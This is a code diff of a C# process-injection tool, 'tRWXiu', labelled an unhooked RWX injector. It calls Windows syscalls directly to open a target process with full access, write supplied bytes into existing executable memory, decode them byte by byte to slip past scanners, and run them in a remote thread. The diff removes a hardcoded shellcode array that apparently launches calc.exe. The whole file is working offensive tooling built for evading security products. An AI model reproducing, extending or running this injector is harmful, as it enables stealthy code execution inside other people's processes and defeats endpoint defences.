@@ -1,5 +1,6 @@
 ﻿using System;
-using System.Text;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
 using static tRWXiu.Utils.Syscalls;
 
 // trovent RWX injector unhooked 
@@ -8,55 +9,114 @@ namespace tRWXiu
 {
     internal class Program
     {
+        internal static byte[] convert(String data)
+        {
+            string[] data_spl = data.Split(',');
+            byte[] shellcode = new byte[data_spl.Length];
+            int byter = 0;
+            for (int i = 0; i < shellcode.Length; i++)
+            {
+                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
+                shellcode[i] = Convert.ToByte(byter);
+            }
+            return shellcode;
+        }
+
+        internal static Dictionary<string, string> parse(string[] args)
+        {
+            Dictionary<string, string> res = new Dictionary<string, string>();
+            foreach (var arg in args)
+            {
+                string[] split = arg.Split('=');
+                var r = split[0].Replace("/", string.Empty);
+                if (split.Length == 1)
+                {
+                    res[r] = "true";
+                }
+                if (split.Length == 2)
+                {
+                    res[r] = split[1];
+                }
+            }
+            return res;
+        }
+
+        internal static void usage()
+        {
+            Console.WriteLine("Usage:\n\ttRWXiu.exe /pid=<pid> /address=<address> /data=<data> [/verbose]");
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
         static void Main(string[] args)
         {
+            Dictionary<string, string> parameters = parse(args);
+            if (!parameters.ContainsKey("pid") && !parameters.ContainsKey("address") && !parameters.ContainsKey("data"))
+            {
+                usage();
+            }
             //NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId)
             CLIENT_ID ClientId = new CLIENT_ID();
-            ClientId.UniqueProcess = new IntPtr(16104);
+            ClientId.UniqueProcess = new IntPtr(Convert.ToInt32(parameters["pid"]));
+            Console.WriteLine("PID: " + ClientId.UniqueProcess);
             OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();
             uint AccessMask = 0x000F000 | 0x00100000 | 0x0000FFFF; //PROCESS_ALL_ACCESS
             IntPtr ProcessHandle = IntPtr.Zero;
             var status = NtOpenProcess(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);
-            Console.WriteLine("status: " + status + " process: " + ProcessHandle);
+            if (status == 0)
+            {
+                Console.WriteLine("[+] Successfully obtained handle: [{0}]", ProcessHandle);
+            }
 
             //NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten)
-            IntPtr bAddress = new IntPtr(0x21C724D0000);
-            byte[] buffer = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
-                                        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
-                                        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
-                                        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
-                                        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
-                                        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
-                                        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
-                                        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
-                                        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
-                                        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
-                                        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
-                                        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
-                                        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
-                                        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
-                                        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
-                                        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
-                                        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
-                                        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
-                                        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
+            IntPtr bAddress = new IntPtr(Convert.ToInt64(parameters["address"], 16));
+            byte[] buffer = convert(parameters["data"]);
             uint size = (uint)buffer.Length;
             uint written = 0;
             status = NtWriteVirtualMemory(ProcessHandle, bAddress, buffer, size, ref written);
-            Console.WriteLine("Written: " + written + " status: " + status);
+            if (status == 0)
+            {
+                Console.WriteLine(String.Format("[+] Stage 1 completed. Successfully written [{0}] encrypted bytes", written));
+            }
+
+            Console.WriteLine("[*] Decrypting bytes...");
+            byte[] buf = new byte[1];
+            for (int i = buffer.Length-1; i >= 0; i--)
+            {
+                byte b = (byte)(((uint)buffer[i] - 5) & 0xFF);
+                buf = new byte[] { b };
+                NtWriteVirtualMemory(ProcessHandle, bAddress + i, buf, 1, ref written);
+                if (((i % 100) == 0))
+                {
+                    Console.Write(".");
+                }
+                if (parameters.ContainsKey("verbose"))
+                {
+                    Console.WriteLine(String.Format("Modified: {1} byte in address: [{0}] with value: {2}", bAddress+i, written, BitConverter.ToString(buf)));
+                }
+            }
+            Console.WriteLine();
+            Console.WriteLine(String.Format("[+] Stage 2 completed. Successfully decrypted bytes"));
 
             //NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead)
-            uint read = 0;
-            buffer = new byte[size];
-            status = NtReadVirtualMemory(ProcessHandle, bAddress, buffer, size, ref read);
-            Console.WriteLine("Read: " + read + " status: " + status);
-            Console.WriteLine("Buffer: " + BitConverter.ToString(buffer));
+            if (parameters.ContainsKey("verbose"))
+            {
+                uint read = 0;
+                buffer = new byte[size];
+                status = NtReadVirtualMemory(ProcessHandle, bAddress, buffer, size, ref read);
+                Console.WriteLine("Status: {0}, read: {1}", status, read);
+                Console.WriteLine("Buffer hex: " + BitConverter.ToString(buffer));
+            }
 
+            Console.WriteLine("[*] Stage 3 in progress...");
             //NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList)
-
             IntPtr tHandle = IntPtr.Zero;
             status = NtCreateThreadEx(ref tHandle, 0x02000000, IntPtr.Zero, ProcessHandle, bAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("status: " + status);
+            if (status == 0)
+            {
+                Console.WriteLine("[+] Successfully executed code");
+            }
         }
     }
 }
